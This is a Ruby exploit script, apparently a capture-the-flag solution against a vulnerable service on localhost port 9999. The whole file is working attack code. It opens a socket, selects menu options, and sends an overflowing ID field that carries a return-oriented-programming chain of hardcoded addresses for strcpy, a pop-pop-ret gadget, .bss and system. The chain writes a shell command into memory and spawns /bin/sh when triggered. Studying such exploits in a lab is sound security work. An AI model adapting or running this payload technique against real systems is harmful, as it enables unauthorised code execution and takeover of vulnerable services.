require 'socket'

class Exploit
	def initialize
		@s = TCPSocket.new('localhost', 9999)

		Thread.new do
			loop do
				print @s.read(1)
			end
		end
	end	
	def add
		@s.write("1\n")

		id = pw = ""

		max = 0x400 - 4
		(max/4).times do |x|
			id +=  "%04X" % x
		end

		(max/4).times do |x|
			pw += "%04X" % (0x3fc + x)
		end

		bin_sh = 0x08048F9E
		strcpy_plt = 0x08048580 
		ppr = 0x08048DEE
		bss = 0x0804B3D4
		_exit = 0x080486D4
		system = 0x08048590

		id = "A"*(0xbe * 4) + "AAA"
		id += [strcpy_plt, ppr, bss + 7, 0x08049090, strcpy_plt, ppr, bss+8, 0x08048F63, system, _exit, bss].pack('<I*')
		id = id.ljust(0xd2 *4 , "D")
		id += [strcpy_plt, ppr, bss, bin_sh, ppr].pack('<I*')
		id += "BBBB"
		id = id.ljust(max, "C")
		p id
		
		@s.write(id + "\n")
		@s.write(pw + "\n")
		@s.flush
	end


	def trigger
		@s.write("5\n")
		@s.close_write
	end
end

s = Exploit.new
s.add
$stdin.readline
s.trigger
$stdin.readline
